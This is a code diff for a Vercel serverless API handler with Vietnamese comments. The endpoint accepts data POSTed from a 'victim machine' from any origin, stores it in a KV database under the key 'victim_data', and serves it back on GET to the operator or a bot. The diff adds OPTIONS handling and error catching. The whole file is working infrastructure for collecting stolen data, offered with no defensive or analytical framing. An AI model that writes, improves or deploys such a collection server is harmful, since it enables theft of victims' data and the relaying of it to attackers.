@@ -1,19 +1,25 @@
 import { kv } from '@vercel/kv';
 
 export default async function handler(req, res) {
-  // Cho phép mọi nguồn gửi dữ liệu tới (CORS)
+  // Cấu hình để máy nạn nhân và Bot đều gọi được link này
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  // Nếu máy nạn nhân gửi dữ liệu lên (POST)
-  if (req.method === 'POST') {
-    const data = req.body;
-    await kv.set('system_data_store', data);
-    return res.status(200).json({ status: 'success' });
-  }
+  if (req.method === 'OPTIONS') return res.status(200).end();
 
-  // Nếu bạn hoặc Bot vào xem dữ liệu (GET)
-  const savedData = await kv.get('system_data_store');
-  return res.status(200).json(savedData || { message: "Chưa có dữ liệu mới" });
+  try {
+    if (req.method === 'POST') {
+      const data = req.body;
+      // Lưu dữ liệu vào Database KV
+      await kv.set('victim_data', data);
+      return res.status(200).json({ status: 'success' });
+    }
+
+    // Nếu là GET: Lấy dữ liệu ra
+    const data = await kv.get('victim_data');
+    return res.status(200).json(data || { message: "Chua co du lieu" });
+  } catch (error) {
+    return res.status(500).json({ error: error.message });
+  }
 }
